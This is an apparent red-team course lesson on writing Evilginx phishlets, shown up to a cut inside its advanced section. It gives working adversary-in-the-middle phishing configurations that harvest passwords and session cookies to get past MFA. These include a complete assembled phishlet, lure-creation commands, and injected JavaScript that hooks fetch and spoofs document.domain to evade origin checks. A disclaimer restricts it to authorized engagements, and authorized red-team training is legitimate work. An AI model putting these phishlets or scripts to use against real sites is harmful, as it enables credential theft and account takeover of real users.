# Lesson 2: Creating Evilginx Phishlets - Techniques and Best Practices

> **Course:** Red Team Phishing and Adversary Simulation
> **Prerequisite:** Familiarity with Evilginx3 installation, basic DNS configuration, and HTTP/TLS fundamentals
> **Objective:** By the end of this lesson you will be able to manually create a production-ready Evilginx phishlet from scratch for any web application, understand every YAML directive, and apply advanced techniques for federated auth, MFA bypass via session hijacking, and single-page application targets.
> **Disclaimer:** This material is intended exclusively for authorized red team and purple team security engagements. All activities must be performed under written authorization (NDA/SOW). Unauthorized use is illegal and unethical.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [The Evilginx Architecture](#2-the-evilginx-architecture)
3. [Phishlet Anatomy](#3-phishlet-anatomy)
   - 3.1 [Header](#31-header)
   - 3.2 [proxy_hosts](#32-proxy_hosts)
   - 3.3 [sub_filters](#33-sub_filters)
   - 3.4 [auth_tokens](#34-auth_tokens)
   - 3.5 [credentials](#35-credentials)
   - 3.6 [auth_urls](#36-auth_urls)
   - 3.7 [login](#37-login)
   - 3.8 [force_post](#38-force_post)
   - 3.9 [js_inject](#39-js_inject)
4. [Step-by-Step: Building a Phishlet from Scratch](#4-step-by-step-building-a-phishlet-from-scratch)
5. [Advanced Techniques](#5-advanced-techniques)
6. [Common Mistakes](#6-common-mistakes)
7. [Testing Methodology](#7-testing-methodology)
8. [Best Practices](#8-best-practices)

---

## 1. Introduction

### Why Manual Phishlet Creation Matters

Automated tools like RTLPhishletGenerator provide an excellent starting point, but real-world engagements regularly present targets that defy automation. Custom portals, non-standard authentication flows, chained identity providers, CAPTCHA gates, and single-page applications with client-side routing all demand manual understanding.

A red team operator who can only run automated generators is limited to well-known platforms. An operator who understands every line of a phishlet YAML can:

- **Adapt on the fly** when a target updates its login flow mid-engagement.
- **Chain multiple identity providers** (e.g., a custom portal that federates to ADFS, which federates to Azure AD).
- **Debug failures** by reading proxy logs and correlating them to specific phishlet directives.
- **Handle edge cases** like WebSocket authentication, API-first login flows, and mobile-responsive endpoints that behave differently.
- **Bypass advanced defenses** including origin-checking JavaScript, Content Security Policy headers, and Subresource Integrity checks.

This lesson teaches you the complete mental model and the hands-on skills to build phishlets from zero.

---

## 2. The Evilginx Architecture

Before writing a single line of YAML, you must understand what Evilginx actually does at the network level.

### 2.1 Reverse Proxy Model

Evilginx operates as a man-in-the-middle reverse proxy. It sits between the victim's browser and the legitimate target server. Every HTTP request from the victim is received by Evilginx, modified according to the phishlet rules, forwarded to the real server, and the response is modified and sent back to the victim.

```
Victim Browser  <--HTTPS-->  Evilginx Proxy  <--HTTPS-->  Real Target Server
   (phishing domain)            (your VPS)          (login.targetcorp.com)
```

The key insight is that the victim interacts with what appears to be the real website. The HTML, CSS, JavaScript, and cookies are all real -- they come from the actual server. Evilginx simply relays them while performing surgical string replacements so that all references to the real domain point to the phishing domain instead.

### 2.2 TLS and Certificates

Evilginx automatically provisions TLS certificates via Let's Encrypt (ACME) for every hostname defined in the phishlet's `proxy_hosts`. This means:

- Your phishing domain must have valid DNS records pointing to the Evilginx server.
- Wildcard certificates are not used by default; each subdomain gets its own certificate.
- Certificate provisioning happens at phishlet enable time, so DNS must be configured before enabling.

### 2.3 DNS Requirements

For each `proxy_host` entry, you need an A record (or AAAA for IPv6) pointing to your Evilginx server. If the target uses `login.targetcorp.com` and `api.targetcorp.com`, and your phishing domain is `evil.example.com`, you need:

```
login.evil.example.com  ->  A  ->  <your-server-ip>
api.evil.example.com    ->  A  ->  <your-server-ip>
```

A common approach is to use a wildcard DNS record:

```
*.evil.example.com  ->  A  ->  <your-server-ip>
```

### 2.4 Traffic Flow in Detail

Here is the complete lifecycle of a single phished request:

1. **Victim clicks the lure link** -- e.g., `https://login.evil.example.com/signin?client_id=abc`
2. **TLS handshake** between victim browser and Evilginx using the Let's Encrypt certificate for `login.evil.example.com`.
3. **Evilginx receives the HTTP request**, identifies the matching `proxy_host` (`login.evil.example.com` maps to `login.targetcorp.com`).
4. **Request modification** -- domain names in request headers (Host, Referer, Origin) are rewritten from the phishing domain back to the real domain.
5. **Evilginx opens a TLS connection to the real server** (`login.targetcorp.com`) and forwards the modified request.
6. **Real server responds** with HTML/CSS/JS/JSON containing references to `targetcorp.com`.
7. **Response modification** -- Evilginx applies `sub_filters` to replace all occurrences of real domains with phishing domains in the response body. Headers like `Location`, `Set-Cookie` domain attributes, and CSP headers are also rewritten.
8. **Cookie capture** -- If the response sets cookies matching `auth_tokens`, Evilginx stores them.
9. **Credential capture** -- If the request is a POST matching `credentials` keys, Evilginx extracts and stores them.
10. **Auth detection** -- If the request URL matches an `auth_urls` pattern, Evilginx marks the session as authenticated.

### 2.5 Session Tracking

Evilginx assigns each victim a unique session ID stored in a cookie on the phishing domain. This allows Evilginx to:

- Track which victim is which across multiple requests.
- Collect all auth tokens for a specific victim over time.
- Know when a victim has successfully authenticated.
- Redirect victims to a designated landing page after authentication.

---

## 3. Phishlet Anatomy

A phishlet is a YAML file that tells Evilginx how to proxy a specific target. Every section has a precise purpose. We will cover each one exhaustively.

### 3.1 Header

The header provides metadata about the phishlet.

```yaml
name: 'targetcorp'
author: 'RedTeamOperator'
min_ver: '3.2.0'
```

| Field     | Purpose |
|-----------|---------|
| `name`    | Unique identifier for the phishlet. Used in Evilginx CLI commands (`phishlets enable targetcorp`). Use lowercase, no spaces. |
| `author`  | Your handle or team name. Informational only. |
| `min_ver` | Minimum Evilginx version required to parse this phishlet. Use `3.2.0` or later for v3 features like `js_inject`. If you use features from a newer version, set this accordingly. |

**Important:** The `name` field must be unique across all loaded phishlets. If two phishlets share a name, only one will load.

### 3.2 proxy_hosts

This is arguably the most critical section. It defines which hostnames Evilginx will proxy and how they map from phishing subdomains to real subdomains.

```yaml
proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'targetcorp.com'
    session: true
    is_landing: true

  - phish_sub: 'api'
    orig_sub: 'api'
    domain: 'targetcorp.com'
    session: true
    is_landing: false

  - phish_sub: 'cdn-assets'
    orig_sub: 'cdn'
    domain: 'targetassets.net'
    session: false
    is_landing: false
```

| Field        | Type    | Purpose |
|--------------|---------|---------|
| `phish_sub`  | string  | The subdomain on YOUR phishing domain. If your phishing domain is `evil.example.com` and `phish_sub` is `login`, the victim sees `login.evil.example.com`. |
| `orig_sub`   | string  | The real subdomain of the target. Maps `login.evil.example.com` to `login.targetcorp.com`. Use empty string `''` for the apex domain. |
| `domain`     | string  | The real target domain (without subdomain). |
| `session`    | boolean | If `true`, cookies from this host are tracked for the victim's session. Set to `true` for any host that sets authentication-related cookies. |
| `is_landing` | boolean | If `true`, this is where the lure URL points. Only one host should have `is_landing: true`. This is the entry point. |

#### How to Determine Which Hosts You Need

This is where reconnaissance is essential. During your analysis of the target:

1. **Open browser DevTools (Network tab)** and navigate through the entire login flow.
2. **Record every domain** that receives requests during the login process.
3. **Pay special attention to redirects** -- federated login flows often bounce through 3-5 different domains.
4. **Check for cross-origin API calls** -- modern SPAs often call APIs on different subdomains.
5. **Look at cookie domains** -- cookies set on `.targetcorp.com` apply to all subdomains; these are often the session cookies.

#### Session vs Non-Session Hosts

- **session: true** -- Use for any host that sets cookies needed for post-authentication access. This includes the main application domain and any identity provider domains that set session cookies.
- **session: false** -- Use for static asset CDNs, analytics domains, font servers, or any host that does not set authentication-relevant cookies. These hosts still need to be proxied if they are referenced in the login page (otherwise the page will load resources from the real domain, breaking the illusion).

#### Phish_sub Naming Strategy

The `phish_sub` can differ from `orig_sub`. This is useful when:

- The real subdomain contains dots (e.g., `auth.us-east-1`) which cannot appear in a single DNS label.
- You want to disguise the purpose of the subdomain.

```yaml
# Real: auth.us-east-1.targetcorp.com
# Phishing: auth-us-east-1.evil.example.com
- phish_sub: 'auth-us-east-1'
  orig_sub: 'auth.us-east-1'
  domain: 'targetcorp.com'
  session: true
  is_landing: false
```

### 3.3 sub_filters

Sub_filters define string replacements applied to HTTP responses. They are the mechanism by which Evilginx rewrites references to real domains so they point to the phishing domain.

```yaml
sub_filters:
  - triggers_on: 'login.targetcorp.com'
    orig_sub: 'login'
    domain: 'targetcorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'login.targetcorp.com'
    orig_sub: 'api'
    domain: 'targetcorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'login.targetcorp.com'
    orig_sub: 'cdn'
    domain: 'targetassets.net'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'login.targetcorp.com'
    orig_sub: ''
    domain: 'targetcorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']
```

| Field         | Purpose |
|---------------|---------|
| `triggers_on` | Which proxied host's responses should be scanned for this replacement. Use the **real** hostname (e.g., `login.targetcorp.com`). |
| `orig_sub`    | The subdomain portion being replaced. Combined with `domain` to form the search target. |
| `domain`      | The domain portion being replaced. |
| `search`      | The string to search for. `{hostname}` is a special variable that expands to `orig_sub.domain` (e.g., `api.targetcorp.com`). You can also use literal strings. |
| `replace`     | The replacement string. `{hostname}` expands to `phish_sub.phishing_domain` (e.g., `api.evil.example.com`). |
| `mimes`       | Array of MIME types to apply this filter to. Only responses with a matching `Content-Type` header are filtered. |

#### The {hostname} Variable

The `{hostname}` variable is the workhorse of sub_filters. When used in both `search` and `replace`:

- **search:** `{hostname}` expands to `orig_sub` + `.` + `domain` (the real hostname).
- **replace:** `{hostname}` expands to `phish_sub` + `.` + `phishing_domain` (the phishing hostname).

This automatically handles the domain swap without hardcoding any values.

#### Cross-Domain Filtering

A critical concept: responses from one host often contain references to other hosts. For example, the HTML from `login.targetcorp.com` might contain JavaScript that calls `api.targetcorp.com`. You need sub_filters that trigger on `login.targetcorp.com` but replace `api.targetcorp.com`.

```yaml
# Response from login.targetcorp.com contains: fetch("https://api.targetcorp.com/v1/auth")
# We need to rewrite it to: fetch("https://api.evil.example.com/v1/auth")
- triggers_on: 'login.targetcorp.com'
  orig_sub: 'api'
  domain: 'targetcorp.com'
  search: '{hostname}'
  replace: '{hostname}'
  mimes: ['text/html', 'application/javascript', 'application/json']
```

#### MIME Types to Include

Common MIME types you should filter:

| MIME Type                    | When to Include |
|------------------------------|----------------|
| `text/html`                  | Always -- HTML pages contain domain references everywhere |
| `application/javascript`     | Almost always -- JS files contain API endpoints, redirect URLs |
| `application/json`           | When the app makes AJAX/fetch calls returning JSON with URLs |
| `text/css`                   | Rarely needed -- only if CSS references domain-specific URLs (e.g., `background-image: url(...)`) |
| `application/xml`            | For SAML/XML-based authentication flows |
| `text/xml`                   | Same as above |
| `application/x-javascript`   | Legacy MIME type for JavaScript, some servers still use it |

#### Literal String Replacements

Sometimes you need to replace strings that are not simple hostnames. For example, encoded or escaped domain names:

```yaml
# Replace escaped domain in JSON strings: "login.targetcorp.com" might appear as
# "login.targetcorp.com" escaped as "login.targetcorp.com" or "login\.targetcorp\.com"
- triggers_on: 'login.targetcorp.com'
  orig_sub: ''
  domain: 'targetcorp.com'
  search: 'targetcorp\.com'
  replace: '{hostname}'
  mimes: ['application/javascript']
```

### 3.4 auth_tokens

Auth tokens define which cookies (or other tokens) Evilginx should capture. These are what allow you to hijack the authenticated session after the victim logs in.

#### Cookie-Based Tokens (Most Common)

```yaml
auth_tokens:
  - domain: '.targetcorp.com'
    keys:
      - 'session_id'
      - 'auth_token'
      - 'XSRF-TOKEN'
      - '__Host-sess'

  - domain: 'login.targetcorp.com'
    keys:
      - 'login_hint'
      - 'sso_session'
```

| Field    | Purpose |
|----------|---------|
| `domain` | The cookie domain. Use `.targetcorp.com` (with leading dot) for cookies set on the root domain (which apply to all subdomains). Use `login.targetcorp.com` (no leading dot) for cookies specific to that subdomain. |
| `keys`   | Array of cookie names to capture. |

#### Key Modifiers

Auth token keys support several modifiers that change capture behavior:

```yaml
auth_tokens:
  - domain: '.targetcorp.com'
    keys:
      # Exact match -- capture cookie named exactly "session_id"
      - 'session_id'

      # Regex match -- capture any cookie whose name matches this pattern
      - 'sess_.*:regexp'

      # Optional -- do not fail the session if this cookie is not present
      - 'analytics_id:opt'

      # Always capture -- keep capturing this cookie even after auth is detected
      - 'refresh_token:always'

      # Combined modifiers
      - 'token_.*:regexp:opt'
```

| Modifier   | Purpose |
|------------|---------|
| `:regexp`  | Treat the key as a regular expression pattern. Useful when cookie names contain dynamic components (e.g., session IDs embedded in cookie names). |
| `:opt`     | Mark the cookie as optional. Without this, Evilginx waits for ALL listed cookies before considering auth tokens complete. If a cookie is sometimes absent, mark it optional to avoid hanging. |
| `:always`  | Continue capturing this cookie even after authentication is detected. Useful for refresh tokens that get rotated. |

#### How to Identify the Right Cookies

1. **Log in to the target normally** with DevTools open (Application tab > Cookies).
2. **Note all cookies set after successful authentication** -- these are your auth_tokens.
3. **Test by deleting cookies one at a time** -- if deleting a cookie forces re-authentication, it is essential.
4. **Pay attention to cookie domains** -- cookies on `.targetcorp.com` versus `app.targetcorp.com` are different scopes.
5. **Look for HttpOnly and Secure flags** -- these are good indicators of session cookies.

#### Body-Based Tokens

Some applications return authentication tokens in the response body (e.g., JWT in a JSON response) rather than as cookies:

```yaml
auth_tokens:
  - domain: 'api.targetcorp.com'
    keys:
      - 'access_token:body'
      - 'refresh_token:body'
    type: 'body'
    path: '/api/v1/auth/token'
```

#### Header-Based Tokens

In rare cases, tokens are returned via response headers:

```yaml
auth_tokens:
  - domain: 'api.targetcorp.com'
    keys:
      - 'X-Auth-Token:header'
    type: 'header'
```

**Note:** Body-based and header-based token capture is less common and support varies by Evilginx version. Cookie-based capture is the standard approach and works for the vast majority of targets.

### 3.5 credentials

The credentials section defines how Evilginx extracts usernames and passwords from the victim's login submissions.

#### Standard POST-Based Extraction

```yaml
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

| Field    | Purpose |
|----------|---------|
| `key`    | The POST parameter name (form field name) that contains the credential. |
| `search` | A regex applied to the parameter value. The first capture group `(.*)` is what Evilginx stores. |
| `type`   | The source type. `post` means the value comes from a POST request body (form data). |

#### JSON-Based Credentials

Modern SPAs often submit credentials as JSON instead of form-encoded data:

```yaml
credentials:
  username:
    key: 'user.email'
    search: '(.*)'
    type: 'json'
  password:
    key: 'credentials.password'
    search: '(.*)'
    type: 'json'
```

When `type` is `json`, the `key` supports dot notation for nested JSON objects:

```json
{
  "user": {
    "email": "victim@targetcorp.com"
  },
  "credentials": {
    "password": "s3cret!"
  }
}
```

#### Regex Matching for Complex Values

Sometimes the credential is embedded in a larger string and needs extraction:

```yaml
credentials:
  username:
    key: 'login_payload'
    search: 'username=([^&]+)'
    type: 'post'
  password:
    key: 'login_payload'
    search: 'password=([^&]+)'
    type: 'post'
```

#### Multi-Step Login Flows

Many modern applications split the login into two pages: one for the username (email), and another for the password. Both are captured because Evilginx sees all POST requests for the session. As long as the `key` names match the form fields on each page, both will be captured from separate requests.

```yaml
# Step 1: User enters email on /login/identifier
# POST body: identifier=user@targetcorp.com
# Step 2: User enters password on /login/challenge
# POST body: passwd=s3cret!

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
```

#### Custom Credential Fields

You are not limited to `username` and `password`. You can capture additional fields:

```yaml
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'otp_code'
      name: 'mfa_token'
      search: '(.*)'
      type: 'post'
```

### 3.6 auth_urls

Auth URLs define URL patterns that indicate a successful authentication. When a request or redirect matches one of these patterns, Evilginx marks the session as authenticated and triggers the post-authentication behavior (redirection, token export).

```yaml
auth_urls:
  - '/dashboard'
  - '/app/home'
  - '/api/v1/user/profile'
  - 'https://app.targetcorp.com/.*:regexp'
```

| Pattern Type | Example | Behavior |
|-------------|---------|----------|
| Simple path | `'/dashboard'` | Matches if the request path starts with `/dashboard` |
| Regex pattern | `'/callback\?code=.*:regexp'` | Matches using regular expression (note the `:regexp` suffix) |
| Full URL | `'https://app.targetcorp.com/home'` | Matches the complete URL including domain |

#### How to Determine Auth URLs

1. **Complete a real login** with DevTools Network tab open.
2. **Identify the first request after successful authentication** -- this is typically a redirect to a dashboard, home page, or token endpoint.
3. **Look for the URL that only appears after valid credentials + MFA** -- not after just the first step.
4. **Be specific enough** to avoid false positives (e.g., `/dashboard` is better than `/` which would match everything).

#### Common Auth URL Patterns

```yaml
# Generic web apps
auth_urls:
  - '/dashboard'
  - '/home'
  - '/app'

# OAuth/OIDC flows -- the callback with authorization code
auth_urls:
  - '/oauth/callback\?code=:regexp'
  - '/signin-oidc'

# API-first apps -- the token endpoint response
auth_urls:
  - '/api/auth/session'
  - '/api/v1/me'
```

### 3.7 login

The login section tells Evilginx which URL is the entry point for the phishing lure.

```yaml
login:
  domain: 'targetcorp.com'
  path: '/login'
```

| Field    | Purpose |
|----------|---------|
| `domain` | The real target domain (must match one of the `proxy_hosts` domains). |
| `path`   | The path to the login page on the real target. |

When Evilginx generates a lure URL, it constructs it from the `is_landing` host and this login path. For example, the lure might be:

```
https://login.evil.example.com/login?param=value
```

#### SSO Considerations

For targets that use SSO/federation, the login path might not be on the main application domain. For example:

```yaml
# The application is at app.targetcorp.com but login is at idp.targetcorp.com
login:
  domain: 'targetcorp.com'
  path: '/adfs/ls/?client-request-id=...'
```

In some cases, the login page is on an entirely different domain (e.g., Okta, Azure AD). You need to include that domain in `proxy_hosts` and set it as the landing page, or set the login path to the application URL that redirects to the IdP.

```yaml
# User starts at app, gets redirected to IdP automatically
login:
  domain: 'targetcorp.com'
  path: '/signin'
  # /signin on app.targetcorp.com returns 302 -> login.idprovider.com/authorize?...
```

### 3.8 force_post

Force_post modifies specific POST request parameters before they are forwarded to the real server. This is useful when:

- The target includes anti-CSRF tokens that reference the real domain.
- Hidden form fields contain values that would reveal the proxy.
- The application validates origin/referrer in POST data (not headers -- Evilginx handles headers automatically).

```yaml
force_post:
  - path: '/login/authenticate'
    search:
      - {key: 'redirect_uri', search: 'https://login\.evil\.example\.com', replace: 'https://login.targetcorp.com', mimes: ['application/x-www-form-urlencoded']}
      - {key: 'origin_url', search: '(.*)', replace: 'https://targetcorp.com/dashboard', mimes: ['application/x-www-form-urlencoded']}

  - path: '/oauth/authorize'
    search:
      - {key: 'redirect_uri', search: '{hostname}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
```

| Field    | Purpose |
|----------|---------|
| `path`   | The POST request path to intercept. |
| `search` | Array of search-and-replace rules for POST body parameters. |
| `key`    | The POST parameter name to modify. |
| `search` (inner) | Regex or literal string to find in the parameter value. |
| `replace` | The replacement string. |
| `mimes`  | MIME types of POST bodies to apply this to. |

#### When to Use force_post

- **OAuth redirect_uri validation:** The real server validates that `redirect_uri` points to the real domain. Without force_post, the phishing domain leaks through.
- **CSRF tokens containing domain references:** Some frameworks embed the domain in CSRF tokens.
- **Hidden fields with absolute URLs:** Forms sometimes include hidden fields with the real domain.

### 3.9 js_inject

JavaScript injection allows you to insert custom JavaScript into proxied pages. This is powerful for handling SPA authentication flows, intercepting client-side tokens, and modifying application behavior.

```yaml
js_inject:
  - trigger_domains: ['login.targetcorp.com']
    trigger_paths: ['/login.*:regexp']
    trigger_params: []
    script: |
      // Wait for the SPA to render the login form
      function waitForElement(selector, callback) {
        const observer = new MutationObserver((mutations, obs) => {
          const el = document.querySelector(selector);
          if (el) {
            obs.disconnect();
            callback(el);
          }
        });
        observer.observe(document.body, { childList: true, subtree: true });
      }

      // Intercept fetch to capture API-based auth tokens
      const originalFetch = window.fetch;
      window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
        if (url.includes('/api/auth/token')) {
          const clone = response.clone();
          const data = await clone.json();
          // Token is now in the response; Evilginx captures cookies automatically
          console.log('Auth flow detected');
        }
        return response;
      };
```

| Field              | Purpose |
|--------------------|---------|
| `trigger_domains`  | Array of real domains (not phishing domains) that trigger the injection. |
| `trigger_paths`    | Array of URL path patterns. Supports `:regexp` suffix. |
| `trigger_params`   | Array of query parameter names that must be present for injection to trigger. Use empty array `[]` for no parameter requirement. |
| `script`           | The JavaScript code to inject into the page. |

#### Common Use Cases for js_inject

1. **SPA Token Interception** -- Single-page apps often store tokens in `localStorage` or `sessionStorage` instead of cookies. Inject JS to intercept and exfiltrate these tokens.

2. **Disabling Security Checks** -- Some JavaScript validates `window.location.origin` against an allowlist. Inject code to override this check.

3. **Form Manipulation** -- Modify form actions, intercept `XMLHttpRequest`, or override `fetch` to ensure credentials pass through Evilginx.

4. **Anti-Detection Bypass** -- Override `document.domain`, navigator properties, or other signals that client-side detection scripts check.

```yaml
# Example: Override origin check in SPA
js_inject:
  - trigger_domains: ['app.targetcorp.com']
    trigger_paths: ['/.*:regexp']
    trigger_params: []
    script: |
      // Override origin validation
      Object.defineProperty(document, 'domain', {
        get: function() { return 'targetcorp.com'; }
      });
```

---

## 4. Step-by-Step: Building a Phishlet from Scratch

This section walks through the complete process of building a phishlet for a fictional corporate portal at `portal.acmecorp.com`.

### Step 1: Reconnaissance -- Map the Login Flow

Open a private browser window with DevTools (Network tab) recording. Navigate to the target login page and complete a full authentication flow.

**What to record:**

- Every domain that receives requests (check the Network tab, filter by "All").
- All redirects (3xx responses) -- follow the chain.
- Which domains set cookies, and which cookie names.
- The POST request(s) that submit credentials -- note the URL, Content-Type, and body format.
- The URL you land on after successful authentication.
- Any JavaScript files loaded from external domains.

**Example findings for acmecorp:**

```
Domains observed:
  - portal.acmecorp.com        (main app, landing page)
  - auth.acmecorp.com          (identity provider, login form)
  - static.acmecdn.net          (CSS/JS/images)
  - api.acmecorp.com            (REST API, called by SPA)

Login flow:
  1. GET portal.acmecorp.com/login -> 302 redirect to auth.acmecorp.com/authorize?...
  2. GET auth.acmecorp.com/authorize -> renders login form
  3. POST auth.acmecorp.com/login (form-encoded: username, password)
  4. GET auth.acmecorp.com/mfa -> renders MFA form
  5. POST auth.acmecorp.com/mfa/verify (form-encoded: otp_code)
  6. 302 redirect to portal.acmecorp.com/callback?code=abc123
  7. GET portal.acmecorp.com/dashboard (authenticated)

Cookies set after auth:
  - .acmecorp.com: session_id, csrf_token
  - auth.acmecorp.com: auth_session, remember_me
  - portal.acmecorp.com: app_session

Credential POST (Step 3):
  Content-Type: application/x-www-form-urlencoded
  Body: username=user@acmecorp.com&password=P@ssw0rd

MFA POST (Step 5):
  Content-Type: application/x-www-form-urlencoded
  Body: otp_code=123456
```

### Step 2: Define the Header

```yaml
name: 'acmecorp'
author: 'RedTeamOps'
min_ver: '3.2.0'
```

### Step 3: Define proxy_hosts

From our recon, we identified four domains. Map each one:

```yaml
proxy_hosts:
  # Main application -- this is where the victim lands first
  - phish_sub: 'portal'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    session: true
    is_landing: true

  # Identity provider -- handles the actual login
  - phish_sub: 'auth'
    orig_sub: 'auth'
    domain: 'acmecorp.com'
    session: true
    is_landing: false

  # REST API -- SPA calls this for data
  - phish_sub: 'api'
    orig_sub: 'api'
    domain: 'acmecorp.com'
    session: true
    is_landing: false

  # CDN -- static assets, no auth cookies
  - phish_sub: 'static'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    session: false
    is_landing: false
```

### Step 4: Define sub_filters

For each pair of (response-source, referenced-domain), create a sub_filter. Think of it as a matrix: every domain's responses might reference every other domain.

```yaml
sub_filters:
  # --- Responses from portal.acmecorp.com ---
  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'auth'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'api'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  # --- Responses from auth.acmecorp.com ---
  - triggers_on: 'auth.acmecorp.com'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'auth.acmecorp.com'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript']

  - triggers_on: 'auth.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  # --- Responses from api.acmecorp.com ---
  - triggers_on: 'api.acmecorp.com'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['application/json']

  - triggers_on: 'api.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['application/json']
```

### Step 5: Define auth_tokens

From our recon, we identified the important cookies:

```yaml
auth_tokens:
  - domain: '.acmecorp.com'
    keys:
      - 'session_id'
      - 'csrf_token'

  - domain: 'auth.acmecorp.com'
    keys:
      - 'auth_session'
      - 'remember_me:opt'

  - domain: 'portal.acmecorp.com'
    keys:
      - 'app_session'
```

Note: `remember_me` is marked `:opt` because it is only set if the user checks "Remember me." Without `:opt`, Evilginx would wait forever for this cookie if the user does not check that box.

### Step 6: Define credentials

```yaml
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

### Step 7: Define auth_urls and login

```yaml
auth_urls:
  - '/callback\?code=:regexp'
  - '/dashboard'

login:
  domain: 'acmecorp.com'
  path: '/login'
```

The `/callback?code=` pattern catches the OAuth redirect, and `/dashboard` catches the final landing page. Either one triggers auth detection.

### Step 8: Test the Phishlet

See [Section 7: Testing Methodology](#7-testing-methodology) for the complete testing process. The summary:

```bash
# Load and enable
phishlets hostname evil.example.com
phishlets enable acmecorp

# Create a lure
lures create acmecorp
lures get-url 0

# Test in a browser
# Navigate to the lure URL
# Complete the login flow
# Check: sessions (should show captured tokens)
```

### Complete Phishlet

Here is the final assembled phishlet:

```yaml
name: 'acmecorp'
author: 'RedTeamOps'
min_ver: '3.2.0'

proxy_hosts:
  - phish_sub: 'portal'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    session: true
    is_landing: true

  - phish_sub: 'auth'
    orig_sub: 'auth'
    domain: 'acmecorp.com'
    session: true
    is_landing: false

  - phish_sub: 'api'
    orig_sub: 'api'
    domain: 'acmecorp.com'
    session: true
    is_landing: false

  - phish_sub: 'static'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    session: false
    is_landing: false

sub_filters:
  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'auth'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'api'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript']

  - triggers_on: 'portal.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'auth.acmecorp.com'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'auth.acmecorp.com'
    orig_sub: 'static'
    domain: 'acmecdn.net'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript']

  - triggers_on: 'auth.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

  - triggers_on: 'api.acmecorp.com'
    orig_sub: 'portal'
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['application/json']

  - triggers_on: 'api.acmecorp.com'
    orig_sub: ''
    domain: 'acmecorp.com'
    search: '{hostname}'
    replace: '{hostname}'
    mimes: ['application/json']

auth_tokens:
  - domain: '.acmecorp.com'
    keys:
      - 'session_id'
      - 'csrf_token'

  - domain: 'auth.acmecorp.com'
    keys:
      - 'auth_session'
      - 'remember_me:opt'

  - domain: 'portal.acmecorp.com'
    keys:
      - 'app_session'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/callback\?code=:regexp'
  - '/dashboard'

login:
  domain: 'acmecorp.com'
  path: '/login'
```

---

## 5. Advanced Techniques

### 5.1 ADFS/SAML Federation Chains

Enterprise environments frequently use Active Directory Federation Services (ADFS) or other SAML identity providers. The login flow bounces through multiple domains:

```
app.company.com -> adfs.company.com -> login.microsoftonline.com -> back to app
```

You must proxy every domain in the chain:

```yaml
proxy_hosts:
  - phish_sub: 'app'
    orig_sub: 'app'
